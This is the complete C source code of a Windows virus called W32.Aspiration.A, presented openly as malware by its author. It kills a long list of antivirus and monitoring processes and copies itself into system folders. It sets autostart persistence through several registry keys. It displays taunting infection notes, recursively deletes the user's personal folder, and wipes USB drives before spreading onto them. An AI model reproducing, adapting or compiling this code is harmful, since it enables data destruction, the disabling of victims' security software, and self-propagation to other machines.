/*
Payload of W32.Aspiration.A:

- Kills AV processes
- Copies to 4 different locations on PC and writes to Autostart with different ways
- Creates two text files and two HTML files and executes Notepad and IE to show them to the user
- Deletes personal folder
- Copies to USB flash drives (if connected) and deletes the files being saved on them
- ... Some other little things ...

#########################################################################
#########################################################################

	Author: SkyOut

	Compiled with: -> Visual C++ 2005 Express Edition
				   -> Microsoft PSDK for Windows Server 2003 R2

	Finished: 11th July 2006 - 21:30 - GMT +01:00

*/

/* Defining Windows Version being WindowsXP (0x0501) */
#define _WIN32_WINNT 0x0501

/* All needed header files */
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <stdio.h>
#include <sys/stat.h>
#include <devguid.h>
#include <regstr.h>
#include <setupapi.h>
#include <tchar.h>
#include <shellapi.h>

/* The first text file (for the user) */
char szTextFile1[] = " \
W32.ASPIRATION.A\r\n \
#################################################################\r\n \
-\r\n \
Your computer has been infected by the aspiration virus...\r\n \
-\r\n \
It's up to you to decide what to do, but it's too late, I don't care what you do now...\r\n \
-\r\n \
I have installed myself on the system...\r\n \
-\r\n \
I have destroyed your files and I will go on doing it...\r\n \
-\r\n \
The only sense in my life is to make yours a hell...";

/* The second text file (for the AV guys) */
char szTextFile2[] = " \
TO ALL THOSE ANTIVIRUS AND SECURITY COMPANIES\r\n \
---------------------------------------------\r\n \
\r\n \
You can't stop us, you can't fight all of us!\r\n \
We will win, we will stay, we will go on!\r\n \
Give up or die, we will survive, you won't!\r\n \
FUCK YOU AND GOOD BYE!";

/* The first html file (for the user) */
char szHTMLFile1[] = " \
				  <html>\r\n \
				  <head><title>- - - W32.Aspiration.A - - -</title></head>\r\n \
				  <body text=\"#00FF00\" bgcolor=\"#000000\">\r\n \
				  <h1 align=\"center\">Your computer has been infected by the aspiration virus...</h1>\r\n \
				  <h1 align=\"center\">It's up to you to decide what to do, but it's too late, I don't care what you do now...</h1>\r\n \
				  <h1 align=\"center\">I have installed myself on the system....</h1>\r\n \
				  <h1 align=\"center\">I have destroyed your files and I will go on doing it...</h1>\r\n \
				  <h1 align=\"center\">The only sense in my life is to make yours a hell...</h1>\r\n \
				  <br>\r\n \
				  <br>\r\n \
				  <hr>\r\n \
				  <h1 align=\"center\"><font color=\"#FF0000\">W32.ASPIRATION.A</font></h1>\r\n \
				  </body>\r\n \
				  </html>\r\n";

/* The second html file (for the AV guys)*/
char szHTMLFile2[] = " \
				   <html>\r\n \
				   <head><title>--- TO THE AV COMPANIES OUT THERE ---</title></head>\r\n \
				   <body text=\"#00FF00\" bgcolor=\"#000000\">\r\n \
				   <h1 align=\"center\">THIS PC IS INFECTED</h1>\r\n \
				   <h1 align=\"center\">A STORM OF INFECTIONS WILL FOLLOW</h1>\r\n \
				   <h1 align=\"center\">FUCK OFF - YOU CAN NOT STOP THIS</h1>\r\n \
				   </body>\r\n \
				   </html>";

/* Process list of most AV products - Thanks to Hutley/RRLF */
char *AVProcessList[] = {"avp32.exe", "avpmon.exe", "zonealarm.exe", "vshwin32.exe", "vet95.exe",
    "tbscan.exe", "serv95.exe", "Nspclean.exe", "clrav.com", "scan32.exe",
    "rav7.exe", "navw.exe", "outpost.exe", "nmain.exe", "navnt.exe",
    "mpftray.exe", "lockdown2000.exe", "icssuppnt.exe", "icload95.exe", "iamapp.exe",
    "findviru.exe", "f - agnt95.exe", "dv95.exe", "dv95_o.exe", "claw95ct.exe",
    "cfiaudit.exe", "avwupd32.exe", "avptc32.exe", "_avp32.exe", "avgctrl.exe",
    "apvxdwin.exe", "_avpcc.exe", "avpcc.exe", "wfindv32.exe", "vsecomr.exe",
    "tds2 - nt.exe", "sweep95.exe", "EFINET32.EXE", "scrscan.exe", "safeweb.exe",
    "persfw.exe", "navsched.exe", "nvc95.exe", "nisum.exe", "navlu32.exe",
    "ALOGSERV", "AMON9X", "AVGSERV9", "AVGW", "avkpop",
    "avkservice", "AvkServ", "avkwctl9", "AVXMONITOR9X", "AVXMONITORNT",
    "AVXQUAR", "moolive.exe", "jed.exe", "icsupp95.exe", "ibmavsp.exe",
    "frw.exe", "f - stopw.exe", "espwatch.exe", "procexp", "filemon.exe",
    "regmon.exe", "dvp95.exe", "cfiadmin.exe", "avwin95.exe", "avpm.exe",
    "avp.exe", "ave32.exe", "anti - trojan.exe", "webscan.exe", "webscanx.exe",
    "vsscan40.exe", "tds2 - 98. exe", "SymProxySvc", "SYMTRAY", "TAUMON",
    "TCM", "TDS - 3 ", "TFAK", "vbcmserv", "VbCons",
    "VIR - HELP", "VPC32", "VPTRAY", "VSMAIN", "vsmon",
    "WIMMUN32", "WGFE95", "WEBTRAP", "WATCHDOG", "WrAdmin",
    "sphinx.exe", "scanpm.exe", "rescue.exe", "pcfwallicon.exe", "pavcl.exe",
    "nupgrade.exe", "navwnt.exe", "navapw32.exe", "luall.exe", "iomon98.exe",
    "icmoon.exe", "fprot.exe", "f - prot95.exe", "esafe.exe", "cleaner3.exe",
    "IBMASN.EXE", "AVXW", "cfgWiz", "CMGRDIAN", "CONNECTIONMONITOR",
    "CPDClnt", "DEFWATCH", "CTRL", "defalert", "defscangui",
    "DOORS", "EFPEADM", "ETRUSTCIPE", "EVPN", "EXPERT",
    "fameh32", "fch32", "fih32", "blackice.exe", "avsched32.exe",
    "avpdos32.exe", "avpnt.exe", "avconsol.exe", "ackwin32.exe", "NWTOOL16",
    "pccwin97", "PROGRAMAUDITOR", "POP3TRAP", "PROCESSMONITOR", "PORTMONITOR",
    "POPROXY", "pcscan", "pcntmon", "pavproxy", "PADMIN",
    "pview95", "rapapp.exe", "REALMON", "RTVSCN95", "vsstat.exe",
    "vettray.exe", "tca.exe", "smc.exe", "scan95.exe", "rav7win.exe",
    "pccwin98.exe", "KPFW32.EXE", "ADVXDWIN", "padmin.exe", "normist.exe",
    "navw32.exe", "n32scan.exe", "lookout.exe", "iface.exe", "icloadnt.exe",
    "SPYXX", "SS3EDIT", "SweepNet", "iamserv.exe", "fp - win.exe",
    "f - prot.exe", "ecengine.exe", "cleaner.exe", "cfind.exe", "blackd.exe",
    "RULAUNCH", "sbserv", "SWNETSUP", "WrCtrl", "avpupd.exe",
    "avkserv.exe", "autodown.exe", "_avpm.exe", "AvpM.exe", "regedit.exe",
    "msconfig.exe", "FPROT95.EXE", "IBMASN.EXE", "sfc.exe", "regedt32.exe",
    "offguard.exe", "pav.exe", "pavmail.exe", "per.exe", "perd.exe",
    "pertsk.exe", "perupd.exe", "pervac.exe", "pervacd.exe", "th.exe",
    "th32.exe", "th32upd.exe", "thav.exe", "thd.exe", "thd32.exe",
    "thmail.exe", "alertsvc.exe", "amon.exe", "kpf.exe", "antivir",
    "avsynmgr.exe", "cfinet.exe", "cfinet32.exe", "icmon.exe", "lockdownadvanced.exe",
    "lucomserver.exe", "mcafee", "navapsvc.exe", "navrunr.exe", "nisserv.exe",
    "nsched32.exe", "pcciomon.exe", "pccmain.exe", "pview95.exe", "Avnt.exe",
    "Claw95cf.exe", "Dvp95_0.exe", "Vscan40.exe", "Icsuppnt.exe", "Jedi.exe",
    "N32scanw.exe", "Pavsched.exe", "Pavw.exe", "Avrep32.exe", "Monitor.exe",
    "fsgk32", "fsm32", "fsma32", "fsmb32", "gbmenu",
    "GBPOLL", "GENERICS", "GUARD", "IAMSTATS", "ISRV95",
    "LDPROMENU", "LDSCAN", "LUSPT", "MCMNHDLR", "MCTOOL",
    "MCUPDATE", "MCVSRTE", "MGHTML", "MINILOG", "MCVSSHLD",
    "MCAGENT", "MPFSERVICE", "MWATCH", "NeoWatchLog", "NVSVC32",
    "NWService", "NTXconfig", "NTVDM", "ntrtscan", "npssvc",
    "npscheck", "netutils", "ndd32", "NAVENGNAVEX15", "notstart.exe",
    "zapro.exe", "pqremove.com", "BullGuard", "CCAPP.EXE", "vet98.exe",
    "VET32.EXE", "VCONTROL.EXE", "claw95.exe", "ANTS", "ATCON",
    "ATUPDATER", "ATWATCH", "AutoTrace", "AVGCC32", "AvgServ",
    "AVWINNT", "fnrb32", "fsaa", "fsav32", "ZAP.EXE",
    "ZAPD.EXE", "ZAPPRG.EXE", "ZAPS.EXE", "ZCAP.EXE", "pfwagent.exe",
	"pfwcon.exe", "zlclient.exe", 0};

/* Going through the array of processes and comparing the names with running processes, if
it matches, the process will be terminated */
void KillProcess(char *AVProcessList)
{
	HANDLE hProcSnap;
	HANDLE hProc;
	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(hProcSnap, &pe32);

	do
	{
		hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
		if(strcmp(pe32.szExeFile, AVProcessList)==0)
		{
			TerminateProcess(hProc, 0);
			CloseHandle(hProc);
		}
		CloseHandle(hProc);

	}while (Process32Next(hProcSnap, &pe32));
}

/* Deleting a directory given to this function recursively */
BOOL DeleteDirectoryRecursive(char *szPathToDelete) 
{
	HANDLE hFind;
    WIN32_FIND_DATA w32FD;
    char szFileName[MAX_PATH];
 
    strcpy_s(szFileName, sizeof(szFileName), szPathToDelete);
    strcat_s(szFileName, sizeof(szFileName), "\\*");

    hFind = FindFirstFile(szFileName, &w32FD);

	/* As long as files and folders are found in a directory do this */	
	do
	{
		/* Go on when the file name is NOT " . " and " .. " */
		if (!((strcmp((char*) w32FD.cFileName, ".") && strcmp((char*) w32FD.cFileName, ".."))))
		{
			continue;
		}

		((strcpy_s(szFileName, sizeof(szFileName), szPathToDelete)) & (strcat_s(szFileName, sizeof(szFileName), "\\")));
        strcat_s(szFileName, sizeof(szFileName), w32FD.cFileName);

		/* If the folder is a directoy than remove it or stop if it does'nt work */
        if(w32FD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{
            if(!DeleteDirectoryRecursive(szFileName)) 
			{ 
                FindClose(hFind); 
                return 0; 
            }
            RemoveDirectory(szFileName);
        }
        else 
		{
			/* If the file we want to delete is readonly change file attributes, so we can delete it */
            if(w32FD.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
			{
                _chmod(szFileName, _S_IWRITE);
			}

			/* Delete the file or stop if it doesnt work */
            if(!DeleteFile(szFileName)) 
			{  
                FindClose(hFind); 
                return 0; 
			}
		}
	}while(FindNextFile(hFind, &w32FD));
	FindClose(hFind);

	/* Remove the whole directory now */
	RemoveDirectory(szPathToDelete);
	return 1;
}

/* Check the registry for a special value telling us if the computer is infected */
BOOL TestIfInfected()
{
	HKEY hKey;
	char szBuf[MAX_PATH];
	DWORD dwBufLength = sizeof(szBuf);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Aspiration", 0, KEY_QUERY_VALUE, &hKey);
	RegQueryValueEx(hKey, "infected", 0, NULL, szBuf, &dwBufLength);
	RegCloseKey(hKey);

	/* Check for "HKEY_LOCAL_MACHINE\Software\Aspiration\infected" = "infected" */
	if (szBuf[0]!='i' || szBuf[1]!='n' || szBuf[3]!='f' || szBuf[4]!='e' || szBuf[5]!='c' || szBuf[6]!='t' || szBuf[7]!='e' || szBuf[8]!='d')
	{
		return -1;
	}
	else
	{
		return 0;
	}
}

/* Write the key into the registry showing us that the computer is infected with the virus now */
void Infect(void)
{
	HKEY hKey;
	char szInfected[] = "infected";

	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Aspiration", &hKey);
	RegSetValueEx(hKey, "infected", 0, REG_SZ, szInfected, sizeof(szInfected));
	RegCloseKey(hKey);
}

/* 
Copying to several locations on the computer:
-> %windir%\system32\aspiration.exe
-> %windir%\aspiration.exe
-> %windir%\system32\Hell\aspiration.exe
-> %windir%\Hell\aspiration.exe

Writing to several registry keys: HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER:
(Creating keys if necessary)
->Software\\Microsoft\\Windows\\CurrentVersion\\Run
->Software\\Microsoft\\Windows\\CurrentVersion\\RunServices
->Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
*/
void InfRegCopy(void)
{
	HKEY hKey;
	HMODULE Mod;
	HANDLE hFile;
	char szSysDir[MAX_PATH];
	char szWinDir[MAX_PATH];
	char szSysDir2[MAX_PATH];
	char szWinDir2[MAX_PATH];
	char szSysDir2File[MAX_PATH];
	char szWinDir2File[MAX_PATH];
	char szVirusPath[MAX_PATH];

	Mod = GetModuleHandle(NULL);
	GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));

	GetSystemDirectory(szSysDir, sizeof(szSysDir));
	GetWindowsDirectory(szWinDir, sizeof(szWinDir));
	GetSystemDirectory(szSysDir2, sizeof(szSysDir2));
	GetWindowsDirectory(szWinDir2, sizeof(szWinDir2));
	GetSystemDirectory(szSysDir2File, sizeof(szSysDir2File));
	GetWindowsDirectory(szWinDir2File, sizeof(szWinDir2File));

	strcat_s(szSysDir, MAX_PATH, "\\aspiration.exe");
	strcat_s(szWinDir, MAX_PATH, "\\aspiration.exe");
	strcat_s(szSysDir2, MAX_PATH, "\\Hell");
	strcat_s(szWinDir2, MAX_PATH, "\\Hell");
	strcat_s(szSysDir2File, MAX_PATH, "\\Hell\\aspiration.exe");
	strcat_s(szWinDir2File, MAX_PATH, "\\Hell\\aspiration.exe");

	CreateDirectory(szSysDir2, NULL);
	CreateDirectory(szWinDir2, NULL);

	/* Copy to the locations on the victims computer */
	CopyFile(szVirusPath, szSysDir, FALSE);
	CopyFile(szVirusPath, szWinDir, FALSE);
	CopyFile(szVirusPath, szSysDir2File, FALSE);
	CopyFile(szVirusPath, szWinDir2File, FALSE);

	/* Create the registry keys to make sure that they exist when writing to them */
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", &hKey);

	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", &hKey);

	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", &hKey);
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", &hKey);

	/* Write all the necessary registry keys making our virus start (several times) every login of the user */
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "aspiration", 0, REG_SZ, szSysDir, sizeof(szSysDir));
	RegSetValueEx(hKey, "destiny", 0, REG_SZ, szWinDir, sizeof(szWinDir));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "aspiration", 0, REG_SZ, szSysDir, sizeof(szSysDir));
	RegSetValueEx(hKey, "destiny", 0, REG_SZ, szWinDir, sizeof(szWinDir));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "suicide", 0, REG_SZ, szSysDir2File, sizeof(szSysDir2File));
	RegSetValueEx(hKey, "carnage", 0, REG_SZ, szWinDir2File, sizeof(szWinDir2File));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "suicide", 0, REG_SZ, szSysDir2File, sizeof(szSysDir2File));
	RegSetValueEx(hKey, "carnage", 0, REG_SZ, szWinDir2File, sizeof(szWinDir2File));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "aspiration", 0, REG_SZ, szSysDir, sizeof(szSysDir));
	RegSetValueEx(hKey, "destiny", 0, REG_SZ, szWinDir, sizeof(szWinDir));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "suicide", 0, REG_SZ, szSysDir2File, sizeof(szSysDir2File));
	RegSetValueEx(hKey, "carnage", 0, REG_SZ, szWinDir2File, sizeof(szWinDir2File));
	RegCloseKey(hKey);

	/* Interesting here: Set the startup folder value to a folder we created and where our virus has been copied to */
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Common Startup", 0, REG_SZ, szSysDir2, sizeof(szSysDir2));
	RegCloseKey(hKey);

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "Startup", 0, REG_SZ, szWinDir2, sizeof(szWinDir2));
	RegCloseKey(hKey);
}

/* Writing the two text files and saving them to the program files folder */
void WriteLetters(void)
{
	HANDLE hFile;
	char szProgramFiles[MAX_PATH];
	DWORD dwNumberOfBytesWritten;

	SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFiles);

	chdir(szProgramFiles);

	hFile = CreateFile("ASPIRATION_INFECTION.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szTextFile1, sizeof(szTextFile1), &dwNumberOfBytesWritten, NULL); 
	CloseHandle(hFile);

	hFile = CreateFile("FOR_AV_SECURITY_COMPANIES.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szTextFile2, sizeof(szTextFile2), &dwNumberOfBytesWritten, NULL); 
	CloseHandle(hFile);
}

/* Writing the two html files and saving them to %windir%\system32 and %windir% */
void WriteHTML(void)
{
	HANDLE hFile;
	char szSysDir[MAX_PATH];
	char szWinDir[MAX_PATH];
	DWORD dwNumberOfBytesWritten;

	GetSystemDirectory(szSysDir, sizeof(szSysDir));
	GetWindowsDirectory(szWinDir, sizeof(szWinDir));

	chdir(szSysDir);

	hFile = CreateFile("ASPIRATION_INFECTION.html", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szHTMLFile1, sizeof(szHTMLFile1), &dwNumberOfBytesWritten, NULL); 
	CloseHandle(hFile);

	chdir(szWinDir);

	hFile = CreateFile("ASPIRATION_INFECTION.html", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, szHTMLFile2, sizeof(szHTMLFile2), &dwNumberOfBytesWritten, NULL); 
	CloseHandle(hFile);
}

/* An array of possible drive letter, not including " a: " and " b: " as they could be a floppy drive, which we don't like to have */
char *drives[] =  {"c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
                   "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
                   "y:", "z:", 0};

/* Test the computer for a connected USB flash drive by using the array above */
BOOL IsItUSB(char *drives)
{
	UINT drType = GetDriveType(drives);

	if (drType == DRIVE_REMOVABLE)
	{
		return 1;
	}
	return 0;
}

/* ############################################################################################### */
/* --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- */
/* ############################################################################################### */

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
	BOOL bInfected;
	char szPersonalFolderPath[MAX_PATH];
	char szProgramFilesPath[MAX_PATH];
	char szSysDirHTML[MAX_PATH];
	char szWinDirHTML[MAX_PATH];
	char szFileTXT1[MAX_PATH];
	char szFileTXT2[MAX_PATH];
	int i;

	/* Kill all the processes of the array " AVProcessList " */
	for (i = 0; AVProcessList[i]; i++)
	{
		KillProcess(AVProcessList[i]);
	}

	/* Test if the computer is infected with our virus */
	bInfected = TestIfInfected();

	/* If the computer is not infected -> infect it and write all the necessary files and registry keys */
	if (bInfected = -1)
	{
		Infect();
		InfRegCopy();
		WriteLetters();
		WriteHTML();

		GetSystemDirectory(szSysDirHTML, sizeof(szSysDirHTML));
		GetWindowsDirectory(szWinDirHTML, sizeof(szWinDirHTML));

		strcat_s(szSysDirHTML, MAX_PATH, "\\ASPIRATION_INFECTION.html");
		strcat_s(szWinDirHTML, MAX_PATH, "\\ASPIRATION_INFECTION.html");

		SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFilesPath);

		strcpy_s(szFileTXT1, MAX_PATH, szProgramFilesPath);
		strcpy_s(szFileTXT2, MAX_PATH, szProgramFilesPath);
		strcat_s(szFileTXT1, MAX_PATH, "\\ASPIRATION_INFECTION.txt");
		strcat_s(szFileTXT2, MAX_PATH, "\\FOR_AV_SECURITY_COMPANIES.txt");

		/* Use Internet Explorer to open the two html files */
		ShellExecute(NULL, "open", "IExplore.exe", szSysDirHTML, NULL, SW_MAXIMIZE);
		ShellExecute(NULL, "open", "IExplore.exe", szWinDirHTML, NULL, SW_MAXIMIZE);
	
		/* Use Notepad to open the two text files */
		ShellExecute(NULL, "open", "notepad.exe", szFileTXT1 ,NULL, SW_SHOWNORMAL);
		ShellExecute(NULL, "open", "notepad.exe", szFileTXT2 ,NULL, SW_SHOWNORMAL);
	}

	/* ############################################################### */
	/* --- ---- EVERYTHING BELOW THIS LINE IS DESTRUCTIVE CODE --- --- */
	/* ############################################################### */

	SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, szPersonalFolderPath);

	/* Delete all files and folders recursively in personal folder */
	DeleteDirectoryRecursive(szPersonalFolderPath);

	/*
	If a USB flash drive is connected to the computer:
	->Delete files and folders recursively
	->Copy virus to the drive
	->Copy the two text files to the drive
	*/
	for(i = 0; drives[i]; i++)
	{	
		HANDLE hFile;
		HMODULE Mod;
		char szUSBPath[MAX_PATH];
		char szVirusPath[MAX_PATH];
		DWORD dwNumberOfBytesWritten;

		Mod = GetModuleHandle(NULL);
		GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));

		if (IsItUSB(drives[i]) == 1)
		{
			DeleteDirectoryRecursive(drives[i]);

			strcpy_s(szUSBPath, MAX_PATH, drives[i]);
			strcat_s(szUSBPath, MAX_PATH, "\\aspiration.exe");
			CopyFile(szVirusPath, szUSBPath, FALSE);

			strcpy_s(szUSBPath, MAX_PATH, drives[i]);
			strcat_s(szUSBPath, MAX_PATH, "\\ASPIRATION_INFECTION.txt");

			hFile = CreateFile(szUSBPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			WriteFile(hFile, szTextFile1, sizeof(szTextFile1), &dwNumberOfBytesWritten, NULL); 
			CloseHandle(hFile);

			strcpy_s(szUSBPath, MAX_PATH, drives[i]);
			strcat_s(szUSBPath, MAX_PATH, "\\FOR_AV_SECURITY_COMPANIES.txt");

			hFile = CreateFile(szUSBPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			WriteFile(hFile, szTextFile2, sizeof(szTextFile2), &dwNumberOfBytesWritten, NULL); 
			CloseHandle(hFile);
		}
	}
}